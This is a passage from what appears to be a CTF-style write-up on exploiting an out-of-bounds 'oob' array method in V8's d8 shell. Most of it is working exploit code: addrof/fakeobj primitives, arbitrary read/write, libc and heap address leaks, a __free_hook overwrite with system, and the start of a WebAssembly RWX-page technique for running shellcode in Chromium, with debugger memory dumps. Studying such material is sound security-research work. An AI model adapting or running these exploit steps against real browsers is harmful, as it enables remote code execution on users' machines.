<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">/// Helper functions to convert between float and integer primitives
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span> <span class="c1">// 8 byte array buffer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">f64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Float64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">u64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint32Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// typeof(val) = float
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span> <span class="c1">// Watch for little endianness
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// typeof(val) = BigInt
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">fl_arr</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">,</span> <span class="mf">1.4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">fl_arr_map</span> <span class="o">=</span> <span class="nx">fl_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">tmp_obj</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">obj_arr</span> <span class="o">=</span> <span class="p">[</span><span class="nx">tmp_obj</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">obj_arr_map</span> <span class="o">=</span> <span class="nx">obj_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">in_obj</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// setting the object we want the address of as an element of obj_arr
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">obj_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">in_obj</span><span class="p">;</span> 	
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c1">// oob write. changing the map of obj_arr for the fl_arr map.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">obj_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="nx">fl_arr_map</span><span class="p">);</span> 	
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// even though we are accesing obj_arr, the returned element will be a float
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kd">let</span> <span class="nx">addr</span> <span class="o">=</span> <span class="nx">obj_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>	
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c1">// oob write. restoring the map of the object for the original one
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">obj_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="nx">obj_arr_map</span><span class="p">);</span>	
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c1">// returning the integer representation of the leaked pointer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span>	
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// storing the float value of an arbitrary address as an element of fl_arr
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">fl_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// oob write. replacing the map of the fl_arr to that of the obj_arr
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">fl_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="nx">obj_arr_map</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// even though we are accessing fl_arr, the retur&lt;F3&gt;ned element will be a tagged pointer.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">fl_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// oob write. restoring original map of fl_arr
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">fl_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="nx">fl_arr_map</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// returning tagged pointer of arbitrary address
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">return</span> <span class="nx">fake</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">arb_rw_arr</span> <span class="o">=</span> <span class="p">[</span><span class="nx">fl_arr_map</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">,</span> <span class="mf">1.4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// We have to use tagged pointers for reading, so we tag the addr
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">addr</span> <span class="o">%</span> <span class="mi">2</span><span class="nx">n</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="nx">addr</span> <span class="o">+=</span> <span class="mi">1</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Place a fakeobj right on top of our crafted array with a float array map
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">arb_rw_arr</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Change the elements pointer using our crafted array to read_addr-0x10
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">arb_rw_arr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x10</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Index 0 will then return the value at read_addr
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">fake</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">initial_arb_write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Place a fakeobj right on top of our crafted array with a float array map
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">arb_rw_arr</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Change the elements pointer using our crafted array to write_addr-0x10
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">arb_rw_arr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x10</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Write to index 0 as a floating point value
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">fake</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">val</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">arb_write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// creating an ArrayBuffer holding the value of a 64-bit pointer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">let</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c1">// creating a dataview for the ArrayBuffer object
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">let</span> <span class="nx">dataview</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c1">// retrieving the address of the ArrayBuffer object
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">let</span> <span class="nx">buf_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c1">// retrieveing the address of the backing_store pointer of the
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// ArrayBuffer object located at offset +0x20
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">let</span> <span class="nx">backing_store_addr</span> <span class="o">=</span> <span class="nx">buf_addr</span> <span class="o">+</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c1">// overwritting the backing_store pointer with the value we desire
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// to overwrite
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">initial_arb_write</span><span class="p">(</span><span class="nx">backing_store_addr</span><span class="p">,</span> <span class="nx">addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c1">// using the dataview to dereference the backing pointer and to
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// do the write for us
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">dataview</span><span class="p">.</span><span class="nx">setBigUint64</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">val</span><span class="p">),</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// syntax: setBigUint64(byteOffset, value, littleEndian)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">exploit</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">test_arr</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">test_arr_map</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">test_arr</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c1">// found using memory inspection using GDB
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kd">var</span> <span class="nx">test_arr_map_segment_base</span> <span class="o">=</span> <span class="nx">test_arr_map</span> <span class="o">&amp;</span> <span class="mh">0xffffffff0000</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">heap_pointer</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">test_arr_map_segment_base</span><span class="o">+</span><span class="mi">16</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">heap_base</span> <span class="o">=</span> <span class="nx">heap_pointer</span> <span class="o">-</span> <span class="mh">0xaef50</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nx">print</span><span class="p">(</span><span class="s2">&#34;[+] heap base: 0x&#34;</span><span class="o">+</span><span class="nx">heap_base</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">stack_leak</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">heap_base</span><span class="o">+</span><span class="mh">0x8ff0</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">data_segment_leak</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">stack_leak</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">code_segment_leak</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">data_segment_leak</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">code_segment_base</span> <span class="o">=</span> <span class="nx">code_segment_leak</span> <span class="o">-</span> <span class="mh">0x12120</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nx">print</span><span class="p">(</span><span class="s2">&#34;[+] code base: 0x&#34;</span><span class="o">+</span><span class="nx">code_segment_base</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">first_got_entry</span> <span class="o">=</span> <span class="nx">code_segment_base</span><span class="o">+</span><span class="mh">0xb2c5e0</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">libc_leak</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">first_got_entry</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">libc_base</span> <span class="o">=</span> <span class="nx">libc_leak</span><span class="o">-</span><span class="mh">0x4a090</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nx">print</span><span class="p">(</span><span class="s2">&#34;[+] libc base: 0x&#34;</span><span class="o">+</span><span class="nx">libc_base</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">libc_system</span> <span class="o">=</span> <span class="nx">libc_base</span><span class="o">+</span><span class="mh">0x55410</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nx">print</span><span class="p">(</span><span class="s2">&#34;[+] libc system: 0x&#34;</span><span class="o">+</span><span class="nx">libc_system</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">libc_free_hook</span> <span class="o">=</span> <span class="nx">libc_base</span><span class="o">+</span><span class="mh">0x1eeb28</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nx">print</span><span class="p">(</span><span class="s2">&#34;[+] libc __free_hook: 0x&#34;</span><span class="o">+</span><span class="nx">libc_free_hook</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="nx">print</span><span class="p">(</span><span class="s2">&#34;[+] Popping calc...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nx">arb_write</span><span class="p">(</span><span class="nx">libc_free_hook</span><span class="p">,</span> <span class="nx">libc_system</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;xcalc&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">exploit</span><span class="p">();</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="0602---rwx-webassembly-pages">06.02 - RWX WebAssembly pages</h3>
<p>The previous methodology seems to only work from the d8 shell, however when the exploit is attempted from Chronium, it doesnt seem to work. It looks like the way to conduct the various leaks is not appropiate, as its likely that Chromium may have a different memory layout than the standalone d8 shell. However, there is a more reliable way (without sandboxing) of executing arbitrary code in Chromium using <code>WebAssembly</code> instances, as is possible the <code>RXW</code> memory gets delegated for these  objects. We can see this below:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">vmmap</span>
</span></span><span class="line"><span class="cl"><span class="nl">LEGEND</span><span class="p">:</span> <span class="n">STACK</span> <span class="o">|</span> <span class="n">HEAP</span> <span class="o">|</span> <span class="n">CODE</span> <span class="o">|</span> <span class="n">DATA</span> <span class="o">|</span> <span class="n">RWX</span> <span class="o">|</span> <span class="n">RODATA</span>
</span></span><span class="line"><span class="cl">     <span class="mh">0x69674cbc000</span>      <span class="mh">0x69674cc4000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>     <span class="mi">8000</span> <span class="mi">0</span>      
</span></span><span class="line"><span class="cl">     <span class="mh">0xab4bfd00000</span>      <span class="mh">0xab4bfd01000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>     <span class="mi">1000</span> <span class="mi">0</span>      
</span></span><span class="line"><span class="cl">     <span class="mh">0xf4aa4195000</span>      <span class="mh">0xf4aa4196000</span> <span class="n">rwxp</span>     <span class="mi">1000</span> <span class="mi">0</span>     <span class="c1">// &lt;-- RWX page
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">18</span><span class="n">xg</span> <span class="mh">0x35a4a83e1659</span><span class="o">-</span><span class="mi">1</span>                           <span class="c1">// WASM instance	 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x35a4a83e1658</span><span class="o">:</span>	<span class="mh">0x00003c19a49c9789</span>	<span class="mh">0x00003fd30acc0c71</span> 
</span></span><span class="line"><span class="cl"><span class="mh">0x35a4a83e1668</span><span class="o">:</span>	<span class="mh">0x00003fd30acc0c71</span>	<span class="mh">0x00007ffdf69f0000</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x35a4a83e1678</span><span class="o">:</span>	<span class="mh">0x0000000000010000</span>	<span class="mh">0x000000000000ffff</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x35a4a83e1688</span><span class="o">:</span>	<span class="mh">0x0000555556355838</span>	<span class="mh">0x00003fd30acc0c71</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x35a4a83e1698</span><span class="o">:</span>	<span class="mh">0x00005555563e80f0</span>	<span class="mh">0x00003fd30acc04d1</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x35a4a83e16a8</span><span class="o">:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x35a4a83e16b8</span><span class="o">:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x35a4a83e16c8</span><span class="o">:</span>	<span class="mh">0x00005555563e8110</span>	<span class="mh">0x00003fd30acc04d1</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x35a4a83e16d8</span><span class="o">:</span>	<span class="mh">0x000055555634bb70</span>	<span class="mh">0x00000f4aa4195000</span>    <span class="c1">// WASM instance+0x88
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can allocate a WebAssembly instance holding some arbitrary code, copy a shellcode to the WASM instance&rsquo;s dedicated RWX page, to then execute it. We can do this as follows:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl">	<span class="c1">// from https://wasdk.github.io/WasmFiddle/
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kd">var</span> <span class="nx">wasm_code</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">133</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">96</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">130</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">131</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">129</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">145</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">121</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">138</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">65</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">11</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">wasm_mod</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Module</span><span class="p">(</span><span class="nx">wasm_code</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">wasm_instance</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Instance</span><span class="p">(</span><span class="nx">wasm_mod</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">f</span> <span class="o">=</span> <span class="nx">wasm_instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">main</span><span class="p">;</span>
